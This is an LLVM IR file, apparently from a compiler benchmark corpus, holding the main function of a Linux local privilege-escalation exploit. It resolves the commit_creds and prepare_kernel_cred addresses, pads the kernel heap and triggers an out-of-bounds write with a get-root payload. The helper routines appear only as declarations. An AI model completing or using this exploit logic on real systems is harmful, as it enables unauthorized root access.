; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41994.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41994.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"[.] starting\0A\00", align 1
@.str.1 = private unnamed_addr constant [30 x i8] c"[.] namespace sandbox set up\0A\00", align 1
@.str.2 = private unnamed_addr constant [30 x i8] c"[.] commit_creds:        %lx\0A\00", align 1
@KERNEL_BASE = common dso_local global i64 0, align 8
@COMMIT_CREDS = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [30 x i8] c"[.] prepare_kernel_cred: %lx\0A\00", align 1
@PREPARE_KERNEL_CRED = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [18 x i8] c"[.] padding heap\0A\00", align 1
@KMALLOC_PAD = common dso_local global i32 0, align 4
@PAGEALLOC_PAD = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [26 x i8] c"[.] done, heap is padded\0A\00", align 1
@.str.6 = private unnamed_addr constant [35 x i8] c"[.] executing get root payload %p\0A\00", align 1
@get_root_payload = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [30 x i8] c"[.] done, should be root now\0A\00", align 1
@CR4_DESIRED_VALUE = common dso_local global i32 0, align 4
@NATIVE_WRITE_CR4 = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  %3 = call i32 (...) @setup_sandbox()
  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  %5 = load i64, i64* @KERNEL_BASE, align 8
  %6 = load i64, i64* @COMMIT_CREDS, align 8
  %7 = add nsw i64 %5, %6
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0), i64 %7)
  %9 = load i64, i64* @KERNEL_BASE, align 8
  %10 = load i64, i64* @PREPARE_KERNEL_CRED, align 8
  %11 = add nsw i64 %9, %10
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i64 %11)
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0))
  %14 = load i32, i32* @KMALLOC_PAD, align 4
  %15 = call i32 @kmalloc_pad(i32 %14)
  %16 = load i32, i32* @PAGEALLOC_PAD, align 4
  %17 = call i32 @pagealloc_pad(i32 %16)
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0), i32* @get_root_payload)
  %20 = call i32 @oob_id_match_execute(i8* bitcast (i32* @get_root_payload to i8*))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0))
  %22 = call i32 (...) @check_root()
  br label %23

23:                                               ; preds = %0, %23
  %24 = call i32 @sleep(i32 1000)
  br label %23
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @setup_sandbox(...) #1

declare dso_local i32 @kmalloc_pad(i32) #1

declare dso_local i32 @pagealloc_pad(i32) #1

declare dso_local i32 @oob_id_match_execute(i8*) #1

declare dso_local i32 @check_root(...) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
